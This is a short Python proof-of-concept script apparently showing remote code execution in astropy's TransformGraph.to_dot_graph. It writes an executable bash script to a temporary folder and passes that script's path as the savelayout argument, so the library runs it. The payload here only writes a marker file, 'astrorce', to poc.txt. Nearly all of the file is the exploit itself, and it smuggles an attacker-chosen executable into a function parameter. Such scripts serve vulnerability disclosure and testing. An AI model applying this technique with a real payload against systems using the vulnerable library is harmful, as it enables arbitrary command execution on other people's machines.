import os
from astropy.coordinates.transformations import TransformGraph

codebase_tmp_dir = "./tmp"  
os.makedirs(codebase_tmp_dir, exist_ok=True)  

script_path = os.path.join(codebase_tmp_dir, "script")
poc_path = os.path.join(codebase_tmp_dir, "poc.txt")
dot_graph_path = os.path.join(codebase_tmp_dir, "1.txt")

script_content = f"#!/bin/bash\necho astrorce > {poc_path}"

with open(script_path, "w") as script_file:
    script_file.write(script_content)

os.chmod(script_path, 0o755)

try:
    tg = TransformGraph()
    tg.to_dot_graph(savefn=dot_graph_path, savelayout=script_path)
except Exception as e:
    print(f"Error: {e}")
